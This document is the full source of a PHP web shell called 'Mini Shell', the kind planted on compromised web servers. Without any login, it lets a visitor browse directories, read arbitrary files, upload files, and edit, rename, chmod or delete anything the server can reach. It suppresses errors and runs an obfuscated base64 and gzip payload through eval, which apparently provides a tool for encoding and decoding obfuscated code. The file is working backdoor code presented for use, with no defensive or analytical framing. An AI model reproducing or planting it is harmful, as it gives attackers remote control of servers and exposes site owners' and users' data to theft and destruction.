<?php
error_reporting(0);
set_time_limit(0);
 
if(get_magic_quotes_gpc()){
    foreach($_POST as $key=>$value){
        $_POST[$key] = stripslashes($value);
    }
}
 
echo '<!DOCTYPE HTML>
<HTML>
<HEAD>
<title>Mini Shell</title>
<style>

.filE {
    background:black;
    font-size:11px;
    color:lime;
    box-shadow: 0px 0px 5px 0px #6A6969;
}
.hed {
    background:url("https://s31.postimg.org/70sl7khff/mini.jpg");
    width:700px;
    height:100px;
}
body{
    font-family: "Typesenses", cursive;
    background: url("https://s32.postimg.org/lnl1359ed/min.jpg");
    text-shadow:text-shadow:red 2px 0px 12px; color:#990707;
}
 
#content tr:hover{
    background-color: #630808;
    color:red;
}
#content .first{
    background-color: black;
}
#content .first:hover{
    background-color:  black;
    color:red;
}
table{
    background:#1C1B1B;
    border: 1px solid black;
    box-shadow: 0px 0px 5px 0px #6A6969;
}
H1{
    font-family: "Typesenses", cursive;
}
a{
    color: #BF1010;
    text-decoration: none;
}
a:hover{
    color: black;
    color:black;
}
input,select,textarea{
    background:black;
    color:lime;
    border: 1px #000000 solid;
    -moz-border-radius: 5px;
    -webkit-border-radius:5px;
    border-radius:5px;
    box-shadow: 0px 0px 5px 0px #6A6969;
}
.mens {
    background:#6A6969;
    box-shadow: 0px 0px 5px 0px #6A6969;
    width:700px;
    height:30px;
    color:lime;
    text-decoration: none;
}
</style>
</HEAD>
<BODY><center>
<div class="hed"></div>
<div class="mens">
<a href="?&amp;x=string">Encode Decode</a>
</div></center>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>Current Path : ';
if(isset($_GET['x']) && ($_GET['x'] == 'string')){
$EncodeDecode = "ZWNobyAiPGNlbnRlcj4iOw0KQGluaV9zZXQoJ291dHB1dF9idWZmZXJpbmcnLDApOyANCkBpbmlfc2V0KCdkaXNwbGF5X2Vycm9ycycsIDApOw0KJHRleHQgPSAkX1BPU1RbJ2NvZGUnXTsNCj8+DQo8c3R5bGU+DQouYSB7DQoJYmFja2dyb3VuZDogYmxhY2s7DQoJY29sb3I6IGxpbWU7DQoJYm94LXNoYWRvdzogMHB4IDBweCA1cHggMHB4ICM2QTY5Njk7DQp9DQouYiB7DQoJYmFja2dyb3VuZDogYmxhY2s7DQoJY29sb3I6IGxpbWU7DQoJYm94LXNoYWRvdzogMHB4IDBweCA1cHggMHB4ICM2QTY5Njk7DQp9DQo8L3N0eWxlPg0KPGZvcm0gbWV0aG9kPSJwb3N0Ij48YnI+DQo8dGV4dGFyZWEgY2xhc3M9J2EnIGNvbHM9NjIgcm93cz01IG5hbWU9ImNvZGUiPjwvdGV4dGFyZWE+PGJyPjxicj4NCjxzZWxlY3QgY2xhc3M9J2EnIHNpemU9IjEiIG5hbWU9Im9wZSI+DQo8b3B0aW9uIHZhbHVlPSJ1cmxlbmNvZGUiPnVybDwvb3B0aW9uPg0KPG9wdGlvbiB2YWx1ZT0iYmFzZTY0Ij5CYXNlNjQ8L29wdGlvbj4NCjxvcHRpb24gdmFsdWU9InVyIj5jb252ZXJ0X3V1PC9vcHRpb24+DQo8b3B0aW9uIHZhbHVlPSJnemluZmxhdGVzIj5nemluZmxhdGUgLSBiYXNlNjQ8L29wdGlvbj4NCjxvcHRpb24gdmFsdWU9InN0cjIiPnN0cl9yb3QxMyAtIGJhc2U2NDwvb3B0aW9uPg0KPG9wdGlvbiB2YWx1ZT0iZ3ppbmZsYXRlIj5zdHJfcm90MTMgLSBnemluZmxhdGUgLSBiYXNlNjQ8L29wdGlvbj4NCjxvcHRpb24gdmFsdWU9InN0ciI+c3RyX3JvdDEzIC0gZ3ppbmZsYXRlIC0gc3RyX3JvdDEzIC0gYmFzZTY0PC9vcHRpb24+DQo8b3B0aW9uIHZhbHVlPSJ1cmwiPmJhc2U2NCAtIGd6aW5mbGF0ZSAtIHN0cl9yb3QxMyAtIGNvbnZlcnRfdXUgLSBnemluZmxhdGUgLSBiYXNlNjQ8L29wdGlvbj4NCjwvc2VsZWN0PiZuYnNwOzxpbnB1dCBjbGFzcz0nYicgdHlwZT0nc3VibWl0JyBuYW1lPSdzdWJtaXQnIHZhbHVlPSdFbmNvZGUnPg0KPGlucHV0IGNsYXNzPSdiJyB0eXBlPSdzdWJtaXQnIG5hbWU9J3N1Ym1pdHMnIHZhbHVlPSdEZWNvZGUnPg0KPC9mb3JtPg0KPD9waHAgDQokc3VibWl0ID0gJF9QT1NUWydzdWJtaXQnXTsNCmlmIChpc3NldCgkc3VibWl0KSl7DQokb3AgPSAkX1BPU1RbIm9wZSJdOw0Kc3dpdGNoICgkb3ApIHtjYXNlICdiYXNlNjQnOiAkY29kaT1iYXNlNjRfZW5jb2RlKCR0ZXh0KTsNCmJyZWFrO2Nhc2UgJ3N0cicgOiAkY29kaT0oYmFzZTY0X2VuY29kZShzdHJfcm90MTMoZ3pkZWZsYXRlKHN0cl9yb3QxMygkdGV4dCkpKSkpOw0KYnJlYWs7Y2FzZSAnZ3ppbmZsYXRlJyA6ICRjb2RpPWJhc2U2NF9lbmNvZGUoZ3pkZWZsYXRlKHN0cl9yb3QxMygkdGV4dCkpKTsNCmJyZWFrO2Nhc2UgJ2d6aW5mbGF0ZXMnIDogJGNvZGk9YmFzZTY0X2VuY29kZShnemRlZmxhdGUoJHRleHQpKTsNCmJyZWFrO2Nhc2UgJ3N0cjInIDogJGNvZGk9YmFzZTY0X2VuY29kZShzdHJfcm90MTMoJHRleHQpKTsNCmJyZWFrO2Nhc2UgJ3VybGVuY29kZScgOiAkY29kaT1yYXd1cmxlbmNvZGUoJHRleHQpOw0KYnJlYWs7Y2FzZSAndXInIDogJGNvZGk9Y29udmVydF91dWVuY29kZSgkdGV4dCk7DQpicmVhaztjYXNlICd1cmwnIDogJGNvZGk9YmFzZTY0X2VuY29kZShnemRlZmxhdGUoY29udmVydF91dWVuY29kZShzdHJfcm90MTMoZ3pkZWZsYXRlKGJhc2U2NF9lbmNvZGUoJHRleHQpKSkpKSk7DQpicmVhaztkZWZhdWx0OmJyZWFrO319DQokc3VibWl0ID0gJF9QT1NUWydzdWJtaXRzJ107DQppZiAoaXNzZXQoJHN1Ym1pdCkpew0KJG9wID0gJF9QT1NUWyJvcGUiXTsNCnN3aXRjaCAoJG9wKSB7Y2FzZSAnYmFzZTY0JzogJGNvZGk9YmFzZTY0X2RlY29kZSgkdGV4dCk7DQpicmVhaztjYXNlICdzdHInIDogJGNvZGk9c3RyX3JvdDEzKGd6aW5mbGF0ZShzdHJfcm90MTMoYmFzZTY0X2RlY29kZSgoJHRleHQpKSkpKTsNCmJyZWFrO2Nhc2UgJ2d6aW5mbGF0ZScgOiAkY29kaT1zdHJfcm90MTMoZ3ppbmZsYXRlKGJhc2U2NF9kZWNvZGUoJHRleHQpKSk7DQpicmVhaztjYXNlICdnemluZmxhdGVzJyA6ICRjb2RpPWd6aW5mbGF0ZShiYXNlNjRfZGVjb2RlKCR0ZXh0KSk7DQpicmVhaztjYXNlICdzdHIyJyA6ICRjb2RpPXN0cl9yb3QxMyhiYXNlNjRfZGVjb2RlKCR0ZXh0KSk7DQpicmVhaztjYXNlICd1cmxlbmNvZGUnIDogJGNvZGk9cmF3dXJsZGVjb2RlKCR0ZXh0KTsNCmJyZWFrO2Nhc2UgJ3VyJyA6ICRjb2RpPWNvbnZlcnRfdXVkZWNvZGUoJHRleHQpOw0KYnJlYWs7Y2FzZSAndXJsJyA6ICRjb2RpPWJhc2U2NF9kZWNvZGUoZ3ppbmZsYXRlKHN0cl9yb3QxMyhjb252ZXJ0X3V1ZGVjb2RlKGd6aW5mbGF0ZShiYXNlNjRfZGVjb2RlKCgkdGV4dCkpKSkpKSk7DQpicmVhaztkZWZhdWx0OmJyZWFrO319DQplY2hvICc8dGV4dGFyZWEgY29scz02MiByb3dzPTUgY2xhc3M9ImIiIHJlYWRvbmx5PicuJGNvZGkuJzwvdGV4dGFyZWE+PC9jZW50ZXI+PEJSPjxCUj4nOw0KPz4=";
@eval(gzinflate(base64_decode($EncodeDecode)));
}
if(isset($_GET['path'])){
    $path = base64_decode($_GET['path']);
}else{
    $path = getcwd();
}
$pathen = base64_encode($path);
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);
 
foreach($paths as $id=>$pat){
    if($pat == '' && $id == 0){
        $a = true;
        echo '<a href="?path='.base64_encode("/").'">/</a>';
        continue;
    }
    if($pat == '') continue;
    echo '<a href="?path=';
    $linkpath = '';
    for($i=0;$i<=$id;$i++){
        $linkpath .= "$paths[$i]";
        if($i != $id) $linkpath .= "/";
    }
    echo base64_encode($linkpath);
    echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
    if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
        echo '<font color="green">File Upload Done.</font><br />';
    }else{
        echo '<font color="red">File Upload Error.</font><br />';
    }
}
echo '<form enctype="multipart/form-data" method="POST">
Upload File : <input type="file" name="file" />
<input type="submit" value="upload" />
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
    echo "<tr><td>Current File : ";
    echo base64_decode($_GET['filesrc']);
    echo '</tr></td></table><br />';
    echo("<div class='filE'><pre>".htmlspecialchars(file_get_contents(base64_decode($_GET['filesrc'])))."</pre></div>");
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
    echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
    if($_POST['opt'] == 'chmod'){
        if(isset($_POST['perm'])){
            if(chmod($_POST['path'],$_POST['perm'])){
                echo '<font color="green">Change Permission Done.</font><br />';
            }else{
                echo '<font color="red">Change Permission Error.</font><br />';
            }
        }
        echo '<form method="POST">
        Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="chmod">
        <input type="submit" value="Go" />
        </form>';
    }elseif($_POST['opt'] == 'rename'){
        if(isset($_POST['newname'])){
            if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
                echo '<font color="green">Change Name Done.</font><br />';
            }else{
                echo '<font color="red">Change Name Error.</font><br />';
            }
            $_POST['name'] = $_POST['newname'];
        }
        echo '<form method="POST">
        New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="rename">
        <input type="submit" value="Go" />
        </form>';
    }elseif($_POST['opt'] == 'edit'){
        if(isset($_POST['src'])){
            $fp = fopen($_POST['path'],'w');
            if(fwrite($fp,$_POST['src'])){
                echo '<font color="green">Edit File Done.</font><br />';
            }else{
                echo '<font color="red">Edit File Error.</font><br />';
            }
            fclose($fp);
        }
        echo '<form method="POST">
        <textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="edit">
        <input type="submit" value="Go" />
        </form>';
    }
    echo '</center>';
}else{
    echo '</table><br /><center>';
    if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
        if($_POST['type'] == 'dir'){
            if(rmdir($_POST['path'])){
                echo '<font color="green">Delete Dir Done.</font><br />';
            }else{
                echo '<font color="red">Delete Dir Error.</font><br />';
            }
        }elseif($_POST['type'] == 'file'){
            if(unlink($_POST['path'])){
                echo '<font color="green">Delete File Done.</font><br />';
            }else{
                echo '<font color="red">Delete File Error.</font><br />';
            }
        }
    }
    echo '</center>';
    $scandir = scandir($path);
    echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
    <tr class="first">
        <td><center>Name</center></td>
        <td><center>Size</center></td>
        <td><center>Permissions</center></td>
        <td><center>Options</center></td>
    </tr>';
 
    foreach($scandir as $dir){
        if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
        $dirlink = base64_encode("$path/$dir");
        echo "<tr>
        <td><a href=\"?path=$dirlink\">$dir</a></td>
        <td><center>--</center></td>
        <td><center>";
        if(is_writable("$path/$dir")) echo '<font color="green">';
        elseif(!is_readable("$path/$dir")) echo '<font color="red">';
        echo perms("$path/$dir");
        if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
         
        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&path=$pathen\">
        <select name=\"opt\">
        <option value=\"\"></option>
        <option value=\"delete\">Delete</option>
        <option value=\"chmod\">Chmod</option>
        <option value=\"rename\">Rename</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"dir\">
        <input type=\"hidden\" name=\"name\" value=\"$dir\">
        <input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
        <input type=\"submit\" value=\">\" />
        </form></center></td>
        </tr>";
    }
    echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
    foreach($scandir as $file){
        if(!is_file("$path/$file")) continue;
        $size = filesize("$path/$file")/1024;
        $size = round($size,3);
        if($size >= 1024){
            $size = round($size/1024,2).' MB';
        }else{
            $size = $size.' KB';
        }
        $filelink = base64_encode("$path/$file");
        echo "<tr>
        <td><a href=\"?filesrc=$filelink&path=$pathen\">$file</a></td>
        <td><center>".$size."</center></td>
        <td><center>";
        if(is_writable("$path/$file")) echo '<font color="green">';
        elseif(!is_readable("$path/$file")) echo '<font color="red">';
        echo perms("$path/$file");
        if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&path=$pathen\">
        <select name=\"opt\">
        <option value=\"\"></option>
        <option value=\"delete\">Delete</option>
        <option value=\"chmod\">Chmod</option>
        <option value=\"rename\">Rename</option>
        <option value=\"edit\">Edit</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"file\">
        <input type=\"hidden\" name=\"name\" value=\"$file\">
        <input type=\"hidden\" name=\"path\" value=\"$path/$file\">
        <input type=\"submit\" value=\">\" />
        </form></center></td>
        </tr>";
    }
    echo '</table>
    </div>';
}
echo '
</BODY>
</HTML>';
function perms($file){
    $perms = @fileperms($file);
 
if (($perms & 0xC000) == 0xC000) {
    // Socket
    $info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
    // Symbolic Link
    $info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
    // Regular
    $info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
    // Block special
    $info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
    // Directory
    $info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
    // Character special
    $info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
    // FIFO pipe
    $info = 'p';
} else {
    // Unknown
    $info = 'u';
}
 
// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));
 
// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));
 
// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));
 
    return $info;
}
?>